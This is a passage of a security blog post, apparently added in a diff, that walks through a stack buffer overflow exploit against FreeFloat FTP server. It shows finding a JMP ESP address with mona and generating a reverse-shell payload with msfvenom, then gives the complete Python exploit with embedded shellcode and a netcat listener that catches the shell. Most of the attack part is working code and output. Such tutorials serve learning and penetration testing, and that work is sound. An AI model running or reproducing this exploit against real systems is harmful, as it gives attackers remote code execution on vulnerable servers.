+<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf</span><span style="color:#e6db74">&#34;</span>
+<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf</span><span style="color:#e6db74">&#34;</span>
+<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff</span><span style="color:#e6db74">&#34;</span>
+)
+
+print(<span style="color:#e6db74">&#34;Fuzzing with </span><span style="color:#e6db74">{}</span><span style="color:#e6db74"> bytes&#34;</span><span style="color:#f92672">.</span>format(len(FUZZ)))
+s <span style="color:#f92672">=</span> socket<span style="color:#f92672">.</span>socket(socket<span style="color:#f92672">.</span>AF_INET, socket<span style="color:#f92672">.</span>SOCK_STREAM)
+connect <span style="color:#f92672">=</span> s<span style="color:#f92672">.</span>connect((<span style="color:#e6db74">&#34;192.168.2.250&#34;</span>, <span style="color:#ae81ff">21</span>))
+s<span style="color:#f92672">.</span>recv(<span style="color:#ae81ff">1024</span>)
+s<span style="color:#f92672">.</span>send(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;USER &#34;</span> <span style="color:#f92672">+</span> FUZZ<span style="color:#f92672">.</span>encode() <span style="color:#f92672">+</span> EIP<span style="color:#f92672">.</span>encode() <span style="color:#f92672">+</span> BADCHARS <span style="color:#f92672">+</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\r\n</span><span style="color:#e6db74">&#34;</span>)
+s<span style="color:#f92672">.</span>close()
+
+</code></pre></div><p>We should leave all the rest of the characters as sequence.</p>
+<p><img src="http://bhavsec.com/img/posts/buff-freefloatftp/13.png" alt=""></p>
+<p>Now that we know the following</p>
+<ul>
+<li>Buffer space: 230 bytes</li>
+<li>EIP: buffer space + 4 bytes</li>
+<li>Tested all bad characters (\x00\x0a\x0d)</li>
+</ul>
+<p>We need to identify the executable module, where the EIP will be pointing, that is with the help of JMP ESP</p>
+<p> </p>
+<h2 id="step-5---finding-jmp-esp">Step 5 - Finding JMP ESP</h2>
+<p>EIP holds the address of the next instruction to be executed. That means in order for our shellcode to be executed concurrently with the overflow happening, we need to make sure that the EIP points to the location in memory where our shellcode will be located, it can be any module that executes JMP ESP.</p>
+<ul>
+<li>Click on the Disassembly window, in the left upper location</li>
+<li>Click on View -&gt; Executable Modules (Alt + E)</li>
+<li>Double click on USER32.dll process</li>
+</ul>
+<p>We are presented with multiple modules and the Disassembly instruction. I choose “USER32.dll”. Remember, we need an address that does not contain bad characters.</p>
+<p><img src="http://bhavsec.com/img/posts/buff-freefloatftp/14.png" alt=""></p>
+<ul>
+<li>After that, Right Click on the Disassembly window, in the left upper location.</li>
+<li>Click on Search for -&gt;  All commands in all modules.</li>
+</ul>
+<p><img src="http://bhavsec.com/img/posts/buff-freefloatftp/15.png" alt=""></p>
+<ul>
+<li>Type <code>JMP ESP</code> in Pop-up window and click Find.</li>
+</ul>
+<p><img src="http://bhavsec.com/img/posts/buff-freefloatftp/16.png" alt=""></p>
+<p>Finder will highlight us this line.</p>
+<pre><code>7D96EBC9	FFE4	JMP ESP
+</code></pre><p><img src="http://bhavsec.com/img/posts/buff-freefloatftp/17.png" alt=""></p>
+<p>We can run mona script to see if the “USER32” is ASLR protected (dynamic code execution)</p>
+<ul>
+<li>!mona modules</li>
+<li>Locate the .dll, in this case “USER32”, which has ASLR = False</li>
+</ul>
+<pre><code>!mona modules
+</code></pre><pre><code>!mona find -s &quot;\xFF\xE4&quot; -m USER32.dll
+</code></pre><p><img src="http://bhavsec.com/img/posts/buff-freefloatftp/18.png" alt=""></p>
+<p>Now that we know the target 7D96EBC9, we should verify that we have successfully changed the execution flow to make the EIP execute the JMP ESP instruction within the SHELL32.dll. We will do this by overwriting EIP with the memory address of the JMP ESP instruction and then, once again, writing C’s thereafter. We will use this code to do this.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">import</span> socket
+
+FUZZ <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;A&#34;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">230</span>
+EIP <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\xC9\xEB\x96\x7D</span><span style="color:#e6db74">&#34;</span>
+junk <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;C&#34;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">500</span>
+
+print(<span style="color:#e6db74">&#34;Fuzzing with </span><span style="color:#e6db74">{}</span><span style="color:#e6db74"> bytes&#34;</span><span style="color:#f92672">.</span>format(len(FUZZ)))
+s <span style="color:#f92672">=</span> socket<span style="color:#f92672">.</span>socket(socket<span style="color:#f92672">.</span>AF_INET, socket<span style="color:#f92672">.</span>SOCK_STREAM)
+connect <span style="color:#f92672">=</span> s<span style="color:#f92672">.</span>connect((<span style="color:#e6db74">&#34;192.168.2.250&#34;</span>, <span style="color:#ae81ff">21</span>))
+s<span style="color:#f92672">.</span>recv(<span style="color:#ae81ff">1024</span>)
+s<span style="color:#f92672">.</span>send(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;USER &#34;</span> <span style="color:#f92672">+</span> FUZZ<span style="color:#f92672">.</span>encode() <span style="color:#f92672">+</span> EIP <span style="color:#f92672">+</span> junk<span style="color:#f92672">.</span>encode() <span style="color:#f92672">+</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\r\n</span><span style="color:#e6db74">&#34;</span>)
+s<span style="color:#f92672">.</span>close()
+</code></pre></div><p>After successful execution of the script, we can check the stack data between the As and Cs we see the execution of USER32.</p>
+<p><img src="http://bhavsec.com/img/posts/buff-freefloatftp/19.png" alt=""></p>
+<p>At this point we control the following</p>
+<ul>
+<li>Buffer space: 230 bytes</li>
+<li>EIP: buffer space + 4 bytes (JMP ESP 0x7D96EBC9)</li>
+<li>Identified all bad characters (\x00\x0a\x0d)</li>
+<li>Got successful execution of USER32.dll</li>
+</ul>
+<p> </p>
+<h2 id="step-6---generating-the-exploit-in-shellcode">Step 6 - Generating the exploit in Shellcode</h2>
+<p>The last thing we need to do is generate our shellcode using shikata_ga_nai encoder and add it to the Python script. To do this we need msfvenom.</p>
+<pre><code>msfvenom -p windows/shell_reverse_tcp LHOST=&quot;192.168.2.246&quot; LPORT=&quot;5555&quot; -f py -b '\x00\x0a\x0d' -e x86/shikata_ga_nai
+</code></pre><p>-p = payload</p>
+<p>-a = architecture</p>
+<p>-f = Format</p>
+<p>-b = Specify bad characters</p>
+<p>-e = encoder</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">msfvenom -p windows/shell_reverse_tcp LHOST<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;192.168.2.246&#34;</span> LPORT<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;5555&#34;</span> -f py -b <span style="color:#e6db74">&#39;\x00\x0a\x0d&#39;</span> -e x86/shikata_ga_nai
+<span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> No platform was selected, choosing Msf::Module::Platform::Windows from the payload
+<span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> No arch selected, selecting arch: x86 from the payload
+Found <span style="color:#ae81ff">1</span> compatible encoders
+Attempting to encode payload with <span style="color:#ae81ff">1</span> iterations of x86/shikata_ga_nai
+x86/shikata_ga_nai succeeded with size <span style="color:#ae81ff">351</span> <span style="color:#f92672">(</span>iteration<span style="color:#f92672">=</span>0<span style="color:#f92672">)</span>
+x86/shikata_ga_nai chosen with final size <span style="color:#ae81ff">351</span>
+Payload size: <span style="color:#ae81ff">351</span> bytes
+Final size of py file: <span style="color:#ae81ff">1712</span> bytes
+buf <span style="color:#f92672">=</span>  b<span style="color:#e6db74">&#34;&#34;</span>
+buf <span style="color:#f92672">+=</span> b<span style="color:#e6db74">&#34;\xdb\xc8\xbb\xd3\xeb\x7b\xa0\xd9\x74\x24\xf4\x5a\x2b&#34;</span>
+buf <span style="color:#f92672">+=</span> b<span style="color:#e6db74">&#34;\xc9\xb1\x52\x83\xea\xfc\x31\x5a\x13\x03\x89\xf8\x99&#34;</span>
+buf <span style="color:#f92672">+=</span> b<span style="color:#e6db74">&#34;\x55\xd1\x17\xdf\x96\x29\xe8\x80\x1f\xcc\xd9\x80\x44&#34;</span>
+buf <span style="color:#f92672">+=</span> b<span style="color:#e6db74">&#34;\x85\x4a\x31\x0e\xcb\x66\xba\x42\xff\xfd\xce\x4a\xf0&#34;</span>
+buf <span style="color:#f92672">+=</span> b<span style="color:#e6db74">&#34;\xb6\x65\xad\x3f\x46\xd5\x8d\x5e\xc4\x24\xc2\x80\xf5&#34;</span>
+buf <span style="color:#f92672">+=</span> b<span style="color:#e6db74">&#34;\xe6\x17\xc1\x32\x1a\xd5\x93\xeb\x50\x48\x03\x9f\x2d&#34;</span>
+buf <span style="color:#f92672">+=</span> b<span style="color:#e6db74">&#34;\x51\xa8\xd3\xa0\xd1\x4d\xa3\xc3\xf0\xc0\xbf\x9d\xd2&#34;</span>
+buf <span style="color:#f92672">+=</span> b<span style="color:#e6db74">&#34;\xe3\x6c\x96\x5a\xfb\x71\x93\x15\x70\x41\x6f\xa4\x50&#34;</span>
+buf <span style="color:#f92672">+=</span> b<span style="color:#e6db74">&#34;\x9b\x90\x0b\x9d\x13\x63\x55\xda\x94\x9c\x20\x12\xe7&#34;</span>
+buf <span style="color:#f92672">+=</span> b<span style="color:#e6db74">&#34;\x21\x33\xe1\x95\xfd\xb6\xf1\x3e\x75\x60\xdd\xbf\x5a&#34;</span>
+buf <span style="color:#f92672">+=</span> b<span style="color:#e6db74">&#34;\xf7\x96\xcc\x17\x73\xf0\xd0\xa6\x50\x8b\xed\x23\x57&#34;</span>
+buf <span style="color:#f92672">+=</span> b<span style="color:#e6db74">&#34;\x5b\x64\x77\x7c\x7f\x2c\x23\x1d\x26\x88\x82\x22\x38&#34;</span>
+buf <span style="color:#f92672">+=</span> b<span style="color:#e6db74">&#34;\x73\x7a\x87\x33\x9e\x6f\xba\x1e\xf7\x5c\xf7\xa0\x07&#34;</span>
+buf <span style="color:#f92672">+=</span> b<span style="color:#e6db74">&#34;\xcb\x80\xd3\x35\x54\x3b\x7b\x76\x1d\xe5\x7c\x79\x34&#34;</span>
+buf <span style="color:#f92672">+=</span> b<span style="color:#e6db74">&#34;\x51\x12\x84\xb7\xa2\x3b\x43\xe3\xf2\x53\x62\x8c\x98&#34;</span>
+buf <span style="color:#f92672">+=</span> b<span style="color:#e6db74">&#34;\xa3\x8b\x59\x0e\xf3\x23\x32\xef\xa3\x83\xe2\x87\xa9&#34;</span>
+buf <span style="color:#f92672">+=</span> b<span style="color:#e6db74">&#34;\x0b\xdc\xb8\xd2\xc1\x75\x52\x29\x82\xb9\x0b\x33\xa4&#34;</span>
+buf <span style="color:#f92672">+=</span> b<span style="color:#e6db74">&#34;\x52\x4e\x33\x5d\x10\xc7\xd5\x37\x46\x8e\x4e\xa0\xff&#34;</span>
+buf <span style="color:#f92672">+=</span> b<span style="color:#e6db74">&#34;\x8b\x04\x51\xff\x01\x61\x51\x8b\xa5\x96\x1c\x7c\xc3&#34;</span>
+buf <span style="color:#f92672">+=</span> b<span style="color:#e6db74">&#34;\x84\xc9\x8c\x9e\xf6\x5c\x92\x34\x9e\x03\x01\xd3\x5e&#34;</span>
+buf <span style="color:#f92672">+=</span> b<span style="color:#e6db74">&#34;\x4d\x3a\x4c\x09\x1a\x8c\x85\xdf\xb6\xb7\x3f\xfd\x4a&#34;</span>
+buf <span style="color:#f92672">+=</span> b<span style="color:#e6db74">&#34;\x21\x07\x45\x91\x92\x86\x44\x54\xae\xac\x56\xa0\x2f&#34;</span>
+buf <span style="color:#f92672">+=</span> b<span style="color:#e6db74">&#34;\xe9\x02\x7c\x66\xa7\xfc\x3a\xd0\x09\x56\x95\x8f\xc3&#34;</span>
+buf <span style="color:#f92672">+=</span> b<span style="color:#e6db74">&#34;\x3e\x60\xfc\xd3\x38\x6d\x29\xa2\xa4\xdc\x84\xf3\xdb&#34;</span>
+buf <span style="color:#f92672">+=</span> b<span style="color:#e6db74">&#34;\xd1\x40\xf4\xa4\x0f\xf1\xfb\x7f\x94\x01\xb6\xdd\xbd&#34;</span>
+buf <span style="color:#f92672">+=</span> b<span style="color:#e6db74">&#34;\x89\x1f\xb4\xff\xd7\x9f\x63\xc3\xe1\x23\x81\xbc\x15&#34;</span>
+buf <span style="color:#f92672">+=</span> b<span style="color:#e6db74">&#34;\x3b\xe0\xb9\x52\xfb\x19\xb0\xcb\x6e\x1d\x67\xeb\xba&#34;</span>                                 
+</code></pre></div><p>For this final stage we will use this code, We have added the shellcode, we are sending the data as follows:</p>
+<ul>
+<li>Junk = 230</li>
+<li>JMP ESP = 7D96EBC9</li>
+<li>NOPs = “\x90” * 32</li>
+<li>Shellcode</li>
+</ul>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">import</span> socket
+
+FUZZ <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;A&#34;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">230</span>
+EIP <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\xC9\xEB\x96\x7D</span><span style="color:#e6db74">&#34;</span>
+NOPS <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x90</span><span style="color:#e6db74">&#34;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">32</span>
+
+buf <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;&#34;</span>
+buf <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\xdb\xc8\xbb\xd3\xeb\x7b\xa0\xd9\x74\x24\xf4\x5a\x2b</span><span style="color:#e6db74">&#34;</span>
+buf <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\xc9\xb1\x52\x83\xea\xfc\x31\x5a\x13\x03\x89\xf8\x99</span><span style="color:#e6db74">&#34;</span>
+buf <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x55\xd1\x17\xdf\x96\x29\xe8\x80\x1f\xcc\xd9\x80\x44</span><span style="color:#e6db74">&#34;</span>
+buf <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x85\x4a\x31\x0e\xcb\x66\xba\x42\xff\xfd\xce\x4a\xf0</span><span style="color:#e6db74">&#34;</span>
+buf <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\xb6\x65\xad\x3f\x46\xd5\x8d\x5e\xc4\x24\xc2\x80\xf5</span><span style="color:#e6db74">&#34;</span>
+buf <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\xe6\x17\xc1\x32\x1a\xd5\x93\xeb\x50\x48\x03\x9f\x2d</span><span style="color:#e6db74">&#34;</span>
+buf <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x51\xa8\xd3\xa0\xd1\x4d\xa3\xc3\xf0\xc0\xbf\x9d\xd2</span><span style="color:#e6db74">&#34;</span>
+buf <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\xe3\x6c\x96\x5a\xfb\x71\x93\x15\x70\x41\x6f\xa4\x50</span><span style="color:#e6db74">&#34;</span>
+buf <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x9b\x90\x0b\x9d\x13\x63\x55\xda\x94\x9c\x20\x12\xe7</span><span style="color:#e6db74">&#34;</span>
+buf <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x21\x33\xe1\x95\xfd\xb6\xf1\x3e\x75\x60\xdd\xbf\x5a</span><span style="color:#e6db74">&#34;</span>
+buf <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\xf7\x96\xcc\x17\x73\xf0\xd0\xa6\x50\x8b\xed\x23\x57</span><span style="color:#e6db74">&#34;</span>
+buf <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x5b\x64\x77\x7c\x7f\x2c\x23\x1d\x26\x88\x82\x22\x38</span><span style="color:#e6db74">&#34;</span>
+buf <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x73\x7a\x87\x33\x9e\x6f\xba\x1e\xf7\x5c\xf7\xa0\x07</span><span style="color:#e6db74">&#34;</span>
+buf <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\xcb\x80\xd3\x35\x54\x3b\x7b\x76\x1d\xe5\x7c\x79\x34</span><span style="color:#e6db74">&#34;</span>
+buf <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x51\x12\x84\xb7\xa2\x3b\x43\xe3\xf2\x53\x62\x8c\x98</span><span style="color:#e6db74">&#34;</span>
+buf <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\xa3\x8b\x59\x0e\xf3\x23\x32\xef\xa3\x83\xe2\x87\xa9</span><span style="color:#e6db74">&#34;</span>
+buf <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x0b\xdc\xb8\xd2\xc1\x75\x52\x29\x82\xb9\x0b\x33\xa4</span><span style="color:#e6db74">&#34;</span>
+buf <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x52\x4e\x33\x5d\x10\xc7\xd5\x37\x46\x8e\x4e\xa0\xff</span><span style="color:#e6db74">&#34;</span>
+buf <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x8b\x04\x51\xff\x01\x61\x51\x8b\xa5\x96\x1c\x7c\xc3</span><span style="color:#e6db74">&#34;</span>
+buf <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x84\xc9\x8c\x9e\xf6\x5c\x92\x34\x9e\x03\x01\xd3\x5e</span><span style="color:#e6db74">&#34;</span>
+buf <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x4d\x3a\x4c\x09\x1a\x8c\x85\xdf\xb6\xb7\x3f\xfd\x4a</span><span style="color:#e6db74">&#34;</span>
+buf <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x21\x07\x45\x91\x92\x86\x44\x54\xae\xac\x56\xa0\x2f</span><span style="color:#e6db74">&#34;</span>
+buf <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\xe9\x02\x7c\x66\xa7\xfc\x3a\xd0\x09\x56\x95\x8f\xc3</span><span style="color:#e6db74">&#34;</span>
+buf <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x3e\x60\xfc\xd3\x38\x6d\x29\xa2\xa4\xdc\x84\xf3\xdb</span><span style="color:#e6db74">&#34;</span>
+buf <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\xd1\x40\xf4\xa4\x0f\xf1\xfb\x7f\x94\x01\xb6\xdd\xbd</span><span style="color:#e6db74">&#34;</span>
+buf <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x89\x1f\xb4\xff\xd7\x9f\x63\xc3\xe1\x23\x81\xbc\x15</span><span style="color:#e6db74">&#34;</span>
+buf <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x3b\xe0\xb9\x52\xfb\x19\xb0\xcb\x6e\x1d\x67\xeb\xba</span><span style="color:#e6db74">&#34;</span>
+
+
+print(<span style="color:#e6db74">&#34;Fuzzing with </span><span style="color:#e6db74">{}</span><span style="color:#e6db74"> bytes&#34;</span><span style="color:#f92672">.</span>format(len(FUZZ)))
+s <span style="color:#f92672">=</span> socket<span style="color:#f92672">.</span>socket(socket<span style="color:#f92672">.</span>AF_INET, socket<span style="color:#f92672">.</span>SOCK_STREAM)
+connect <span style="color:#f92672">=</span> s<span style="color:#f92672">.</span>connect((<span style="color:#e6db74">&#34;192.168.2.250&#34;</span>, <span style="color:#ae81ff">21</span>))
+s<span style="color:#f92672">.</span>recv(<span style="color:#ae81ff">1024</span>)
+s<span style="color:#f92672">.</span>send(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;USER &#34;</span> <span style="color:#f92672">+</span> FUZZ<span style="color:#f92672">.</span>encode() <span style="color:#f92672">+</span> EIP <span style="color:#f92672">+</span> NOPS <span style="color:#f92672">+</span> buf <span style="color:#f92672">+</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\r\n</span><span style="color:#e6db74">&#34;</span>)
+s<span style="color:#f92672">.</span>close()
+</code></pre></div><p>Our exploit should look like this:</p>
+<p><img src="http://bhavsec.com/img/posts/buff-freefloatftp/20.png" alt=""></p>
+<p>Before we execute our code, we need to start our netcat listener on kali machine.</p>
+<pre><code>nc -nlvp 5555
+</code></pre><p>Execute the python script and we&rsquo;ll get the reverse shell on netcat listener.</p>
+<p><img src="http://bhavsec.com/img/posts/buff-freefloatftp/21.png" alt=""></p>
+<p> </p>
+<p>Thanks for reading this post, if you like my work you can support by <a href="https://www.buymeacoffee.com/bhavsec">buying me a coffee</a>. ☕️</p>
+
+    </div>
+    
+      
+        <div class="pagination">
+          <div class="pagination__title">
+            <span class="pagination__title-h"
+              >Read other posts</span
+            >
+            <hr />
+          </div>
+          <div class="pagination__buttons">
+            
+              <span class="button previous">
+                <a href="https://bhavsec.com/posts/shellshock/">
+                  <span class="button__icon">←</span>
+                  <span class="button__text">Bash and the Shellshock ⚡️</span>
+                </a>
+              </span>
+            
+            
+              <span class="button next">
+                <a href="https://bhavsec.com/posts/php-deserialization/">
+                  <span class="button__text">Exploiting PHP deserialization 🔐</span>
+                  <span class="button__icon">→</span>
+                </a>
+              </span>
+            
+          </div>
+        </div>
+      
+    
+
+    
+      
+        
+
+      
+    
+  </div>
+
+      </div>
+
+      
+        <footer class="footer">
+  <div class="footer__inner">
+    
+      
+      <div class="copyright">
+        <span> 
+          © 2018-2022
+        </span>
+      </div>
+      <div>
+        <span>    
+        <span>
+        <a href="../../archive">archive</a>
+        &nbsp; 
+        </span>
+          <a href="../../newsletter">newsletter</a>
+        </span>   
+        &nbsp;      
+        <span>
+          <a href="https://creativecommons.org/licenses/by-nc/4.0/" target=”_blank”>license</a>
+        </span>
+        &nbsp;      
+        <span>
+          <a href="http://bhavsec.com/posts/index.xml" target=”_blank”>rss feed</a>
+        </span>
+
+      </div>
+
+    
+  </div>
+</footer>
+
+<script src="../../assets/main.js"></script>
+<script src="../../assets/prism.js"></script>
+
+      
+    </div>
+
+    
+      
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-VY7WJZSQD0"></script>
+<script>
+var doNotTrack = false;
+if (!doNotTrack) {
+	window.dataLayer = window.dataLayer || [];
+	function gtag(){dataLayer.push(arguments);}
+	gtag('js', new Date());
+	gtag('config', 'G-VY7WJZSQD0', { 'anonymize_ip': false });
+}
+</script>
+
+    
+  </body>
+</html>
